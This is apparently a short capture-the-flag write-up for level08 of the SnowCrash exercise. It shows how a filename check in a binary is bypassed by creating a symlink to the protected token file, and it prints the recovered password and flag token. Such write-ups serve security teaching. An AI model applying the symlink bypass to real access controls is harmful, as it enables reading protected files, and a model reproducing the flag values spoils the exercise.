In this level we have two files : level08 and Token
We use Ghidra to read level08 and we understand that the program is able to print what is in the Token, but 

```
  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
  }
```

Denied us the access.

After many discussion and wrong way to solve it, we tried to make a symbolical link of Token juste to change it's name and read what's inside.

ln -s /home/user/level08/token /tmp/test4

Then we execute it : 

level08@SnowCrash:~$ ./level08 /tmp/test4
quif5eloekouj29ke0vouxean

We get our flag! 

We log on flag08 and type getflag and we get our token : 

/*********************************************************\

flag08@SnowCrash:~$ getflag 
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

\*********************************************************/
